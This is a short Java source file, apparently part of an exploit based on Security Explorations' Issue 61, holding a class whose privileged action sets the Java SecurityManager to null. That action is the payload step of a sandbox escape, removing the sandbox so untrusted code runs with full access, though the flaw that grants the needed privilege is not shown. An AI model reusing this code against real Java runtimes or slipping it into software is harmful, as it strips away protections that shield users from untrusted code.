import java.security.AccessController;
import java.security.PrivilegedActionException;
import java.security.PrivilegedExceptionAction;

/**
 * Class for disabling the SecurityManager.
 * Based on POC of Security Explorations' Issue 61.
 * @author mk
 *
 */
public class DisableSecurityManagerAction implements PrivilegedExceptionAction {

	public DisableSecurityManagerAction() {
		try {
			AccessController.doPrivileged(this);
		} catch (PrivilegedActionException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	
	public Object run() throws Exception {
		System.setSecurityManager(null);
		return new Object();
	}

}
